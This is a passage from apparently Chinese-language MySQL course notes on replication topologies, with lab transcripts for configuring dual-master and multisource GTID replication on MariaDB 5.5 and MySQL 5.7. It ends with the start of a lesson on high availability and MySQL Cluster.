已然成为整个半同步提高性能的瓶颈。在高并发业务场景下，这样的机制会影响数据库整体的TPS 。 5.7版本的半同步复制中，独立出一个 ack collector thread ，专门用于接收slave 的反馈信息。这样master 上有两个线程独立工作，可以同时发送binlog 到slave ，和接收slave的反馈。 复制中的单点故障问题复制拓扑_配置M-S-S有很多复杂的拓扑结构，但即使是最简单的也可能会非常灵活。一种拓扑可以有多种用途。 接下来我们讨论一些比较普遍的拓扑结构以及它们的优缺点。记住下面的基本原则： 每个备库必须有一个唯一的服务器ID 一个主库可以有多个备库 mysql5.7开始一个备库可以有多个主库(multisource replication) 如果打开了log_save_updates选项，一个备库可以把其主库上的数据变化传播到其他备库 一主库多备库的结构，备库之间没有交互，它们仅仅是连接到同一个主库上。 尽管这是非常简单的拓扑结构，但它非常灵活，能满足多种需求。 用途： 为不同的角色使用不同的备库（例如添加不同的索引或使用不同的存储引擎）。 把一台备库当作待用的主库，除了复制没有其他数据传输。 将一台备库放到远程数据中心，用作灾难恢复。 延迟一个或多个备库，以备灾难恢复。 使用其中一个备库，作为备份、培训或者测试使用服务器。 优点 ：避免了很多其他拓扑结构的复杂性。 复制拓扑_配置M-M主主复制（也叫做双主复制或双向复制） 包含两台服务器，每一个都被配置成对方的主库和备库，还句话说，它们是一对主库。 应用场景 通常用于特殊的目的。一个可能的应用场景是两个位于不同地理位置的办公室，并且都需要一份可写的数据拷贝。 最大的问题 两个可写的互主服务器导致的问题非常多。这通常发生在两台服务器同时修改一行记录，或同时在量太服务器上向一个包含auto_increment列的表里插入数据。 总的来说，允许向两台服务器上写如带来的麻烦远远大于其带来的好处。 双主步骤 1234567891011121314151617181920mastera masterb主 从 已完成从 主 # 主服务器 masterb 1）修改配置文件 log-bin=/var/lib/mysql-log/masterb server-id=2（重启服务） mkdir /var/lib/mysql-log/ --ugo,selinux 2)&gt; show master status\\G; # 从服务 mastera 1）授权从机 grant replication slave to slave@172.25.0.11 uplooking (masterb &gt; show grants for slave@172.25.0.11;) 2）&gt; change master master_host=&apos;172.25.0.12&apos; master_user=&apos;slave&apos; master_password=&apos;uplooking&apos; master_log_file=&apos;&apos; master_log_pos=&apos;&apos; 3)&gt; start slave; 4)&gt; show slave status\\G; 5)测试 实现 mariadb 5.5 MySQL AB 复制 M-M部署 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153# 双主从[root@masterb0 ~]# vi /etc/my.cnf[root@masterb0 ~]# grep -v &apos;^#&apos; /etc/my.cnf|grep -v &apos;^$&apos;[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0server-id=2log-bin=/var/lib/mysql-log/masterb[mysqld_safe]log-error=/var/log/mariadb/mariadb.logpid-file=/var/run/mariadb/mariadb.pid!includedir /etc/my.cnf.d[root@masterb0 ~]# mkdir /var/lib/mysql-log/[root@masterb0 ~]# chown mysql. /var/lib/mysql-log/[root@masterb0 ~]# getenforcePermissive[root@masterb0 ~]# systemctl restart mariadb## 通过在mastera上添加授权，同步给masterb，允许mastera对masterb有replication slave的权限[root@mastera0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 7Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; grant replication slave on *.* to slave@&apos;172.25.0.11&apos; identified by &apos;uplooking&apos;;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)## 到masterb上检查是否已经同步到对mastera的授权信息[root@masterb0 ~]# mysql -uroot -puplookingWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 4Server version: 5.5.44-MariaDB-log MariaDB ServerCopyright (c) 2000, 2015, Oracle, MariaDB Corporation Ab and others.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.MariaDB [(none)]&gt; show grants for slave@172.25.0.11;+----------------------------------------------------------------------------------------------------------------------------+| Grants for slave@172.25.0.11 |+----------------------------------------------------------------------------------------------------------------------------+| GRANT REPLICATION SLAVE ON *.* TO &apos;slave&apos;@&apos;172.25.0.11&apos; IDENTIFIED BY PASSWORD &apos;*6FF883623B8639D08083FF411D20E6856EB7D2BF&apos; |+----------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)## 查看当前masterb的日志写到哪里了，哪个位置了MariaDB [(none)]&gt; show master status\\G;*************************** 1. row *************************** File: masterb.000001 Position: 245 Binlog_Do_DB:Binlog_Ignore_DB:1 row in set (0.00 sec)## 在mastera上操作，change master toMariaDB [(none)]&gt; change master to master_host=&apos;172.25.0.12&apos;,master_user=&apos;slave&apos;,master_password=&apos;uplooking&apos;,master_log_file=&apos;masterb.000001&apos;,master_log_pos=245;Query OK, 0 rows affected (0.20 sec)MariaDB [(none)]&gt; start slave;Query OK, 0 rows affected (0.00 sec)MariaDB [(none)]&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.12 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: masterb.000001 Read_Master_Log_Pos: 245 Relay_Log_File: mariadb-relay-bin.000002 Relay_Log_Pos: 527 Relay_Master_Log_File: masterb.000001 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 245 Relay_Log_Space: 823 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 21 row in set (0.00 sec)ERROR: No query specified## 测试 在masterb上写数据，测试mastera是否能够同步到MariaDB [(none)]&gt; insert into db1.t1 values (100);Query OK, 1 row affected (0.06 sec)## 在mastera上查看db1.t1表是否同步到数据了MariaDB [(none)]&gt; select * from db1.t1;+-----+| id |+-----+| 1 || 2 || 100 |+-----+3 rows in set (0.00 sec)ERROR: No query specifiedMariaDB [(none)]&gt;MariaDB [(none)]&gt; insert into db1.t1 values (100);Query OK, 1 row affected (0.06 sec)MariaDB [(none)]&gt; select * from db1.t1;+-----+| id |+-----+| 1 || 2 || 100 |+-----+3 rows in set (0.00 sec)MariaDB [(none)]&gt; 复制拓扑_配置M(s)-M(s)拥有备库的主-主结构 为每个主库增加一个备库。 该配置的优点是增加了冗余，对于不同物理位置的复制拓扑，能够消除站点单点失效的问题。还能做读写分离。 如果在本地为了故障转移使用主-主结构，这种配置同样有用。当主库失效时，用备库来代替主库还是可行的，虽然这优点复杂，同样也库一把备库指向一个不同的主库，但需要考虑增加的复杂度。 复制拓扑_配置M-M-S-SMySQL 5.7 开始支持多主库复制 多主库复制（multisource replication）特指一个备库有多个主库。5.7开始支持的，意味着5.7之前的版本不支持。 项目实战6：mysql server 5.7 基于GTID的并行MTS多级主从 Multisource 半同步架构 服务器 ip 功能 软件 mastera 172.25.0.11 主 mysql-community-client 5.7 masterb 172.25.0.12 主 mysql-community-client 5.7 slavea 172.25.0.13 从 mysql-community-client 5.7 slaveb 172.25.0.14 从 mysql-community-client 5.7 安装软件 操作系统 RHEL7.2 下载软件（rpm；本地yum源； 在线yum源；）http://classroom.example.com/materials/mysql-5.7.repo /etc/yum.repos.d/ yum clean all;yum makecache yum list|grep mysqlmysql-community-server 5.7 yum install —-报错，软件冲突：mariadb-libs 5.5 /var/lib/mysql/* rpm -e –nodeps mariadb-libs 服务器端 项目名 内容 软件名 mysql-community-server 5.7 service mysqld daemon mysqld 配置文件 /etc/my.cnf，/etc/my.cnf.d/*.cnf 数据文件 /var/lib/mysql 启动日志 /var/log/mysqld.log 客户端 项目名 内容 软件名 mysql-community-client 5.7 命令 mysql,mysqladmin,mysqlbinlog,mysqldump 服务端启动服务 查看进程ps -ef|grep mysqld 或 systemctl status mysqld 查看端口 netstat -lunpt|grep mysqld 3306 服务端修改初始密码 12grep password /var/log/mysqld.logmysqladmin -uroot -p&apos;&apos; password &apos;(Uploo00king)&apos; 客户端登陆数据库 mysql -uroot -p&apos;(Uploo00king)&apos; mysql.user表的结构变化了，原先的password列改为了authentication_string列 实现半同步，需要先安装半同步插件 M-M-S-S步骤 主服务器 configure 12345678910111213[mysqld]server-id=1log-bin=/var/lib/mysql-log/mastera# GTIDgitd_mode=onenforce_gtid_consistency=1# crash safesync_binlog=1 #强制刷新binlog到磁盘innodb_flush_log_at_trx_commit=1 #强制刷新redolog到磁盘# semi syncrpl-semi_sync_master_enable=1rpl_semi_sync_master_timeout=1000 #msrpl_semi_sync_master_warit_slave_count=num grant replication slave@’172.25.X.%’ mysqldump\\tar\\lvm\\innobackupex 从服务器 configure 123456789101112[mysqld]Server-id=2# GTIDgtid_mode=onenforce_gtid_consistency=1# MTSslave-parallel-type=logical_clockSlave-parallel-workers=16# crash saferelay_log_recovery=1# semi syncrpl_semi_sync_slave_enable=1 mysql -uroot -p’(Uploo00king)’ &lt; mysql.all.sql change mastert to1234master_host=&apos;ip&apos;master_user=&apos;slave&apos;master_password=&apos;&apos;master_auto_position=1 start slave; show slave status\\G; 详细步骤 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515mastera: 1 ssh-keygen -t dsa 2 for i in 11 12 13 14;do ssh-copy-id root@172.25.0.$i;done 3 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;setenforce 0;systemctl stop firewalld;yum install -y wget&quot;;done 4 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;cd /etc/yum.repos.d/;wget http://classroom.example.com/materials/mysql-5.7.repo&quot;;done 5 ls /etc/yum.repos.d/ 6 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;rpm -e --nodeps mariadb-libs&quot;;done 7 yum list|grep mysql 8 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;yum install -y mysql-community*&quot;;done 9 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;systemctl start mysqld&quot;;done**********************每一台都需要修改密码 1 grep password /var/log/mysqld.log 2 mysqladmin -uroot -p&apos;wXE?ekekJ3Na&apos; password &apos;(Uploo00king)&apos;**********************mastera：新建库和表，并全备份,复制到masterb、slavea、slaveb 1 mysql -uroot -p&apos;(Uploo00king)&apos; create database db1; use db1; create table t1 (id int); 2 mysqldump -A -uroot -p&apos;(Uploo00king)&apos; &gt; /tmp/mysql.all.sql 3 for i in 12 13 14 ;do scp /tmp/mysql.all.sql root@172.25.0.$i:/tmp; done 4 for i in 12 13 14 ;do ssh root@172.25.0.$i &quot;mysql -uroot -p&apos;(Uploo00king)&apos; &lt; /tmp/mysql.all.sql&quot;; done************************masterb/slavea/slaveb:#修改配置文件 1 vi /etc/my.cnf#mastera: log-bin=/var/lib/mysql-log/mastera server-id=1 gtid_mode = ON enforce_gtid_consistency = 1#masterb: log-bin=/var/lib/mysql-log/serverb server-id=2 gtid_mode = ON enforce_gtid_consistency = 1#slavea: server-id=3 gtid_mode = ON enforce_gtid_consistency = 1 master-info-repository=TABLE relay-log-info-repository=TABLE#slaveb: server-id=4 gtid_mode = ON enforce_gtid_consistency = 1 master-info-repository=TABLE relay-log-info-repository=TABLEmastera/masterb:创建二进制日志的目录，并修改权限 2 mkdir /var/lib/mysql-log 3 chown mysql. /var/lib/mysql-logmastera：将四台服务器重新启动服务 4 for i in 11 12 13 14;do ssh root@172.25.0.$i &quot;systemctl restart mysqld&quot;;done************************************************mastera--&gt;masterb\\slavea\\slaveb 主从同步masterb--&gt;mastera双主multi-source在mastera上面授权: 1 mysql -uroot -p&apos;(Uploo00king)&apos; mysql&gt; grant replication slave on *.* to slave@172.25.0.12 identified by &apos;(Uploo00king)&apos;; mysql&gt; grant replication slave on *.* to slave@172.25.0.13 identified by &apos;(Uploo00king)&apos;; mysql&gt; grant replication slave on *.* to slave@172.25.0.14 identified by &apos;(Uploo00king)&apos;; mysql&gt; grant replication slave on *.* to slave@172.25.0.11 identified by &apos;(Uploo00king)&apos;; mysql&gt; flush privileges;在masterb上面change master: 2 mysql&gt; change master to master_host=&quot;172.25.0.11&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_auto_position=1; mysql&gt; start slave; mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.11 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mastera.000002 Read_Master_Log_Pos: 1188 Relay_Log_File: masterb0-relay-bin.000002 Relay_Log_Pos: 1397 Relay_Master_Log_File: mastera.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1188 Relay_Log_Space: 1607 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1 Master_UUID: ca914200-225d-11e6-a1ab-52540000000b Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:1-4 Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:1-4 Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version:1 row in set (0.00 sec)ERROR:No query specified#在mastera上面change master： 3 mysql&gt; change master to master_host=&quot;172.25.0.12&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_auto_position=1; mysql&gt; start slave; mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.12 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: serverb.000002 Read_Master_Log_Pos: 154 Relay_Log_File: mastera0-relay-bin.000002 Relay_Log_Pos: 363 Relay_Master_Log_File: serverb.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 154 Relay_Log_Space: 573 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 2 Master_UUID: e9660793-225d-11e6-996d-52540000000c Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:1-6 Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version:1 row in set (0.00 sec)ERROR:No query specified=========================================================================================到此位置mastera和masterb的双主配置好了。可以测试以下。接下来配置多级主从，不要用gtid，用老方法master_log_file和master_log_positon=============================================================================================#在mastera上面查看master的状态: mysql&gt; show master status\\G;*************************** 1. row *************************** File: mastera.000002 Position: 1634 Binlog_Do_DB: Binlog_Ignore_DB:Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:1-6,e9660793-225d-11e6-996d-52540000000c:1-31 row in set (0.00 sec)ERROR:No query specified#在masterb上面去查看master的状态: mysql&gt; show master status\\G;*************************** 1. row *************************** File: serverb.000002 Position: 894 Binlog_Do_DB: Binlog_Ignore_DB:Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:1-6,e9660793-225d-11e6-996d-52540000000c:1-31 row in set (0.00 sec)ERROR:No query specified#在slavea上面去操作: mysql&gt; change master to master_host=&quot;172.25.0.11&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_log_file=&apos;mastera.000002&apos;,master_log_pos=1634 for channel &apos;mastera&apos;; mysql&gt; change master to master_host=&quot;172.25.0.12&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_log_file=&apos;serverb.000002&apos;,master_log_pos=894 for channel &apos;masterb&apos;; mysql&gt; start slave; mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.11 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mastera.000002 Read_Master_Log_Pos: 1885 Relay_Log_File: slavea0-relay-bin-mastera.000002 Relay_Log_Pos: 569 Relay_Master_Log_File: mastera.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1885 Relay_Log_Space: 786 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1 Master_UUID: ca914200-225d-11e6-a1ab-52540000000b Master_Info_File: mysql.slave_master_info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:7 Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:7,e9660793-225d-11e6-996d-52540000000c:4 Auto_Position: 0 Replicate_Rewrite_DB: Channel_Name: mastera Master_TLS_Version:*************************** 2. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.12 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: serverb.000002 Read_Master_Log_Pos: 1142 Relay_Log_File: slavea0-relay-bin-masterb.000002 Relay_Log_Pos: 566 Relay_Master_Log_File: serverb.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1142 Relay_Log_Space: 783 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 2 Master_UUID: e9660793-225d-11e6-996d-52540000000c Master_Info_File: mysql.slave_master_info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: e9660793-225d-11e6-996d-52540000000c:4 Executed_Gtid_Set: ca914200-225d-11e6-a1ab-52540000000b:7,e9660793-225d-11e6-996d-52540000000c:4 Auto_Position: 0 Replicate_Rewrite_DB: Channel_Name: masterb Master_TLS_Version:2 rows in set (0.00 sec)ERROR:No query specified#在slaveb上面去操作: mysql&gt; change master to master_host=&quot;172.25.0.11&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_log_file=&apos;mastera.000002&apos;,master_log_pos=1634 for channel &apos;mastera&apos;; mysql&gt; change master to master_host=&quot;172.25.0.12&quot;,master_user=&quot;slave&quot;,master_password=&quot;(Uploo00king)&quot;,master_log_file=&apos;serverb.000002&apos;,master_log_pos=894 for channel &apos;masterb&apos;; mysql&gt; start slave; mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.11 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mastera.000002 Read_Master_Log_Pos: 1634 Relay_Log_File: slaveb0-relay-bin-mastera.000002 Relay_Log_Pos: 318 Relay_Master_Log_File: mastera.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1634 Relay_Log_Space: 535 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 1 Master_UUID: ca914200-225d-11e6-a1ab-52540000000b Master_Info_File: mysql.slave_master_info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 0 Replicate_Rewrite_DB: Channel_Name: mastera Master_TLS_Version:*************************** 2. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 172.25.0.12 Master_User: slave Master_Port: 3306 Connect_Retry: 60 Master_Log_File: serverb.000002 Read_Master_Log_Pos: 894 Relay_Log_File: slaveb0-relay-bin-masterb.000002 Relay_Log_Pos: 318 Relay_Master_Log_File: serverb.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 894 Relay_Log_Space: 535 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 2 Master_UUID: e9660793-225d-11e6-996d-52540000000c Master_Info_File: mysql.slave_master_info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 0 Replicate_Rewrite_DB: Channel_Name: masterb Master_TLS_Version:2 rows in set (0.00 sec)ERROR:No query specified 可以去测试了： mastera: insert into db1.t1 values (2); masterb slavea slaveb都同步了数据库 masterb:insert into db1.t1 values (3); mastera slavea slaveb都同步了数据库 关闭mastera的数据，对masterb写，slavea和slaveb也能同步数据；再次打开mastera也能同步到数据。 总结重点掌握 主从同步的原理以及同步过程中的延迟和数据一致性问题 mariadb5.5和mysql5.7的主从同步步骤 难点 同步过程中的延迟问题和数据一致性问题","link":"/2016/12/31/booboo_mysql/04-MySQL-replication/"},{"title":"MySQL 管理课程 第八课 高可用性HA","text":"什么是高可用高可用性实际上有点像神秘的野兽。它通常是以百分比表示，这本身也是一种暗示：高可用性不是绝对的，只有相对更高的可用性。100%的可用性是不可能达到的。可用性的“9”规则是表示可用性目标最普遍的方法。你可能也知道，“5个9”表示99.999%的正常可用时间。换句话说，每年只允许5分钟的宕机时间。对于大多数应用这已经是令人惊叹的数字，尽量还有一些人试图获得更多的“9”。 每个应用对可用性的需求各不相同。在设定一个可用时间的目标之前，先问问自己，是不是确实需要达到这个目标。可用性每提高一点，所花费的成本都会远超之前；可用性的效果和开销的比例并不是线性的。需要保证多少可用时间，取决于能够承担多少成本。 高可用实际上是在宕机造成的损失与降低宕机时间所花费的成本之间取一个平衡。换句话说，如果需要花大量金钱去获取更好的可用时间，但所带来的收益却很低，可能就不值得去做。总的来说，应用在超过一定的点以后追求更高的可用性是非常困难的，成本也会很高，因此我们建议设定一个更现实的目标并且避免过渡设计。幸运的是，建立2个9或3个0的可用时间的目标可能并不困难，具体请款取决于应用。 导致宕机的原因 在运行环境的问题中，最普遍的问题是磁盘空间耗尽。 在性能问题中，最普遍的宕机原因确实是运行很糟糕的SQL，但也不一定都是这个原因，比如也有很多问题是由于服务器Bug或错误的行为导致的。 糟糕的Schema和索引设计是第二大影响性能的问题。 复制问题通常是由于主备数据不一致导致。 数据丢失问题通常由于DROP TABLE的误操作导致，并总是伴随着缺少可用备份的问题。 复制虽然被人们用来改善可用时间，但却也可能导致宕机。这主要是由于不确定的使用导致的，即便如此，它也阐明了一个普遍的情况：许多高可用策略可能会产生反作用。 如何实现高可用 降低故障率 优化架构 避免单点故障基于复制的冗余前面我们已经学习MySQL Replication 的内容，如下架构： MySQL 5.6 下的 semi-sync ![ab1](pic/06-MySQL 5.6下的semi-sync.png) MySQL 5.7 下的 semi-sync ![ab2](pic/07-MySQL 5.7下的semi-sync.png) MySQL 同步复制当使用同步复制时，主库的事务只有在至少一个备库上提交才能认为其执行完成。这实现了两个目标： 当服务器崩溃时没有提交的事务会丢失，并且至少有一个备库有实时的数据副本。 大多数同步复制架构运行在主动-主动模式，这意味着每个服务器在任何时候都是故障转移的候选者，这使得通过冗余获得高可用性更加容易。 MySQL 到目前为止，（5.7版本）本身并不支持同步复制，但有两个基于MySQL的集群解决方案支持同步复制。 MySQL Cluster 集群MySQL 中的同步复制首先出现在MySQL Clushter （NDB Cluster）。它在所有节点上进行同步的主-主复制。这意味着可以在任何节点上写入；这些节点拥有等同的读写能力。每一行都是冗余存储的，这样即使丢失一个节点，也不丢失数据，并且集群仍然能提供服务。尽管MySQL Cluster还不是适用于所有应用的完美解决方案，但正如我们在前一章提到的，在最近的版本中它做了非常快速的改进，现在已经拥有大量的新特性和功能：非索引数据的磁盘存储、增加数据节点能够在线扩展、使用ndinfo表来管理集群、配置和管理集群的脚本、多线程操作、下推（push-down）的关联操作（现在称为自适应查询本地化）、能够处理BLOB列和很多列的表、集中式的用户管理，以及通过像memcache协议一样的NDB API来实现NoSQL访问。在下一个版本中将包含最终一致运行模型，包括为跨数据中心的主动-主动复制提供事务冲突检测和跨WAN解决方案。简而言之，MySQL Cluster是一项引人注目的技术。 现在至少有两个为简化集群部署和管理提供附加产品的供应商：Oracle 针对 MySQL Cluster 的服务支持包含了 MySQL Cluster Manager 工具；Serveralines 提供了Cluster Control工具，该工具还能够帮助部署和管理复制集群。 Galera Cluster 